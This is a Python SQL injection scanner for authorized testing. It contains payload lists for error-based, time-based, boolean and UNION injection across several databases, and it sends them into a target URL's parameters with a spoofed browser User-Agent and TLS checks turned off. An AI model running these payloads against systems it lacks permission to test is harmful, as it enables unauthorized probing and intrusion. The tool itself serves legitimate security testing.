#!/usr/bin/env python3
"""
SQL Injection Scanner - Defensive Security Tool

For authorized security testing only. Always obtain proper permission
before scanning any target you do not own.

Usage:
    python sql_injection_scanner.py --url "http://target.com/page?id=1"
    python sql_injection_scanner.py --url "http://target.com/login" --data "user=admin&pass=test"
"""

import argparse
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any

import requests

requests.packages.urllib3.disable_warnings()

ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"valid MySQL result",
    r"MySqlClient\\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\\.",
    r"Driver.*SQL.*Server",
    r"OLE DB.*SQL.*Server",
    r"(W|w)arning.*mssql_.*",
    r"(W|w)arning.*sybase_.*",
    r"Microsoft.*OLE DB.*SQL Server",
    r"Microsoft.*SQL.*Server.*Driver",
    r"ORA-[0-9][0-9][0-9][0-9]",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*oci_.*",
    r"Warning.*ora_.*",
    r"SQLite/JDBCDriver",
    r"SQLite.*Driver",
    r"Warning.*sqlite_.*",
    r"Warning.*SQLite3::",
    r"\[SQLite_ERROR\]",
    r"Microsoft.*Access.*Driver",
    r"JET Database Engine",
    r"Access Database Engine",
    r"ODBC Microsoft Access Driver",
    r"Syntax error.*in query expression",
    r"Unclosed quotation mark",
    r"You have an error in your SQL syntax",
    r"supplied argument is not a valid MySQL",
    r"mysql_fetch_array\\(\\)",
    r"mysql_num_rows\\(\\)",
    r"pg_query\\(\\).*pg_fetch_assoc\\(\\)",
    r"Database error",
    r"DB Error",
    r"SQL error",
    r"Dynamic SQL Error",
]

TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    '" AND SLEEP(5)--',
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "; WAITFOR DELAY '0:0:5'--",
    "' WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)--",
    "'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),5)||'",
    "' AND sqlite3_sleep(5000)--",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    ("' AND 1=1--", "' AND 1=2--"),
    ('" AND 1=1--', '" AND 1=2--'),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
]

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    '" UNION SELECT NULL--',
    '" UNION SELECT NULL,NULL--',
    '" UNION SELECT NULL,NULL,NULL--',
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
]


@dataclass
class Finding:
    parameter: str
    payload: str
    technique: str
    evidence: str
    url: str
    method: str
    response_time: float = 0.0


@dataclass
class ScanResult:
    target: str
    findings: list[Finding] = field(default_factory=list)
    scanned_parameters: list[str] = field(default_factory=list)
    start_time: float = 0.0
    end_time: float = 0.0

    def duration(self) -> float:
        return self.end_time - self.start_time

    def vulnerable(self) -> bool:
        return len(self.findings) > 0


class SQLInjectionScanner:
    def __init__(
        self,
        timeout: int = 30,
        delay: float = 0.5,
        headers: dict[str, str] | None = None,
        proxy: str | None = None,
        time_threshold: float = 4.0,
    ):
        self.timeout = timeout
        self.delay = delay
        self.time_threshold = time_threshold
        self.headers = headers or {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.verify = False

        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.error_patterns = [re.compile(p, re.IGNORECASE) for p in ERROR_SIGNATURES]

    def _request(
        self,
        method: str,
        url: str,
        params: dict[str, str] | None = None,
        data: dict[str, str] | None = None,
    ) -> requests.Response:
        kwargs: dict[str, Any] = {"timeout": self.timeout}
        if params:
            kwargs["params"] = params
        if data:
            kwargs["data"] = data

        return self.session.request(method, url, **kwargs)

    def _baseline(
        self, method: str, url: str, params: dict[str, str], data: dict[str, str] | None
    ) -> requests.Response:
        if method.upper() == "GET":
            return self._request("GET", url, params=params)
        return self._request("POST", url, data=data)

    def _inject(
        self,
        method: str,
        url: str,
        params: dict[str, str],
        data: dict[str, str] | None,
        param: str,
        payload: str,
    ) -> requests.Response:
        if method.upper() == "GET":
            injected = dict(params)
            injected[param] = payload
            return self._request("GET", url, params=injected)
        else:
            injected = dict(data or {})
            injected[param] = payload
            return self._request("POST", url, data=injected)

    def _has_sql_error(self, text: str) -> bool:
        return any(p.search(text) for p in self.error_patterns)

    def _check_error_based(
        self,
        method: str,
        url: str,
        params: dict[str, str],
        data: dict[str, str] | None,
        param: str,
    ) -> Finding | None:
        error_payloads = ["'", '"', "\\", ";", "'\""]
        for payload in error_payloads:
            try:
                resp = self._inject(method, url, params, data, param, payload)
                if self._has_sql_error(resp.text):
                    # Verify with a benign request to reduce false positives
                    benign = self._baseline(method, url, params, data)
                    if not self._has_sql_error(benign.text):
                        return Finding(
                            parameter=param,
                            payload=payload,
                            technique="Error-based",
                            evidence="SQL error message detected in response",
                            url=url,
                            method=method,
                            response_time=resp.elapsed.total_seconds(),
                        )
            except requests.RequestException:
                continue
        return None

    def _check_time_based(
        self,
        method: str,
        url: str,
        params: dict[str, str],
        data: dict[str, str] | None,
        param: str,
    ) -> Finding | None:
        # Baseline timing
        baseline_start = time.time()
        try:
            self._baseline(method, url, params, data)
        except requests.RequestException:
            pass
        baseline_time = time.time() - baseline_start

        for payload in TIME_PAYLOADS:
            try:
                start = time.time()
                resp = self._inject(method, url, params, data, param, payload)
                elapsed = time.time() - start

                if elapsed >= self.time_threshold and elapsed > baseline_time + 3:
                    return Finding(
                        parameter=param,
                        payload=payload,
                        technique="Time-based blind",
                        evidence=f"Response delayed {elapsed:.1f}s (baseline {baseline_time:.1f}s)",
                        url=url,
                        method=method,
                        response_time=elapsed,
                    )
            except requests.RequestException:
                continue
        return None

    def _check_boolean_based(
        self,
        method: str,
        url: str,
        params: dict[str, str],
        data: dict[str, str] | None,
        param: str,
    ) -> Finding | None:
        try:
            baseline = self._baseline(method, url, params, data)
            baseline_len = len(baseline.text)
        except requests.RequestException:
            return None

        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                true_resp = self._inject(method, url, params, data, param, true_payload)
                false_resp = self._inject(method, url, params, data, param, false_payload)

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)

                diff_ratio = abs(true_len - false_len) / max(baseline_len, 1)
                if diff_ratio > 0.05 and abs(true_len - false_len) > 50:
                    return Finding(
                        parameter=param,
                        payload=f"{true_payload} / {false_payload}",
                        technique="Boolean-based blind",
                        evidence=f"Response length differs: {true_len} vs {false_len} bytes",
                        url=url,
                        method=method,
                    )
            except requests.RequestException:
                continue
        return None

    def _check_union_based(
        self,
        method: str,
        url: str,
        params: dict[str, str],
        data: dict[str, str] | None,
        param: str,
    ) -> Finding | None:
        for payload in UNION_PAYLOADS:
            try:
                resp = self._inject(method, url, params, data, param, payload)
                # Look for common SQL union artifacts or changed response structure
                if self._has_sql_error(resp.text):
                    return Finding(
                        parameter=param,
                        payload=payload,
                        technique="Union-based",
                        evidence="SQL error on UNION payload indicates injectable point",
                        url=url,
                        method=method,
                    )
            except requests.RequestException:
                continue
        return None

    def scan(
        self,
        url: str,
        method: str = "GET",
        data: str | None = None,
        cookies: str | None = None,
    ) -> ScanResult:
        result = ScanResult(target=url)
        result.start_time = time.time()

        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))

        post_data: dict[str, str] | None = None
        if data:
            post_data = dict(urllib.parse.parse_qsl(data))

        if cookies:
            self.session.headers["Cookie"] = cookies

        if method.upper() == "GET":
            parameters = list(params.keys())
        else:
            parameters = list(post_data.keys()) if post_data else []

        if not parameters:
            print("[!] No parameters found to test.")
            result.end_time = time.time()
            return result

        print(f"[+] Target: {url}")
        print(f"[+] Method: {method.upper()}")
        print(f"[+] Parameters: {', '.join(parameters)}")
        print(f"[+] Starting scan...\n")

        for param in parameters:
            result.scanned_parameters.append(param)
            print(f"[*] Testing parameter: {param}")

            # Error-based
            finding = self._check_error_based(method, url, params, post_data, param)
            if finding:
                result.findings.append(finding)
                print(f"    [!] {finding.technique} SQL Injection found!")
                print(f"        Payload: {finding.payload}")
                print(f"        Evidence: {finding.evidence}")
                time.sleep(self.delay)
                continue

            # Time-based
            finding = self._check_time_based(method, url, params, post_data, param)
            if finding:
                result.findings.append(finding)
                print(f"    [!] {finding.technique} SQL Injection found!")
                print(f"        Payload: {finding.payload}")
                print(f"        Evidence: {finding.evidence}")
                time.sleep(self.delay)
                continue

            # Boolean-based
            finding = self._check_boolean_based(method, url, params, post_data, param)
            if finding:
                result.findings.append(finding)
                print(f"    [!] {finding.technique} SQL Injection found!")
                print(f"        Payload: {finding.payload}")
                print(f"        Evidence: {finding.evidence}")
                time.sleep(self.delay)
                continue

            # Union-based
            finding = self._check_union_based(method, url, params, post_data, param)
            if finding:
                result.findings.append(finding)
                print(f"    [!] {finding.technique} SQL Injection found!")
                print(f"        Payload: {finding.payload}")
                print(f"        Evidence: {finding.evidence}")
                time.sleep(self.delay)
                continue

            print(f"    [OK] No SQL injection detected")
            time.sleep(self.delay)

        result.end_time = time.time()
        return result


def print_report(result: ScanResult) -> None:
    print("\n" + "=" * 60)
    print("SCAN REPORT")
    print("=" * 60)
    print(f"Target:        {result.target}")
    print(f"Duration:      {result.duration():.1f}s")
    print(f"Parameters:    {len(result.scanned_parameters)}")
    print(f"Findings:      {len(result.findings)}")
    print("-" * 60)

    if result.findings:
        print("\nVULNERABILITIES FOUND:")
        for i, f in enumerate(result.findings, 1):
            print(f"\n  [{i}] {f.technique}")
            print(f"      Parameter: {f.parameter}")
            print(f"      Payload:   {f.payload}")
            print(f"      Evidence:  {f.evidence}")
            print(f"      URL:       {f.url}")
    else:
        print("\nNo SQL injection vulnerabilities detected.")

    print("\n" + "=" * 60)


def save_json(result: ScanResult, path: str) -> None:
    report = {
        "target": result.target,
        "duration_seconds": round(result.duration(), 2),
        "vulnerable": result.vulnerable(),
        "scanned_parameters": result.scanned_parameters,
        "findings": [
            {
                "parameter": f.parameter,
                "technique": f.technique,
                "payload": f.payload,
                "evidence": f.evidence,
                "url": f.url,
                "method": f.method,
                "response_time": round(f.response_time, 2),
            }
            for f in result.findings
        ],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2, ensure_ascii=False)
    print(f"[+] Report saved to {path}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner - For authorized security testing only."
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method")
    parser.add_argument("--data", help="POST data (e.g., user=admin&pass=test)")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds")
    parser.add_argument("--output", help="Save JSON report to file")
    args = parser.parse_args()

    print("=" * 60)
    print("SQL INJECTION SCANNER")
    print("For authorized security testing only.")
    print("=" * 60)

    if args.method.upper() == "POST" and not args.data:
        print("[!] POST method requires --data")
        return 1

    scanner = SQLInjectionScanner(
        timeout=args.timeout,
        delay=args.delay,
        proxy=args.proxy,
    )

    result = scanner.scan(args.url, args.method, args.data, args.cookie)
    print_report(result)

    if args.output:
        save_json(result, args.output)

    return 0 if not result.vulnerable() else 1


if __name__ == "__main__":
    sys.exit(main())
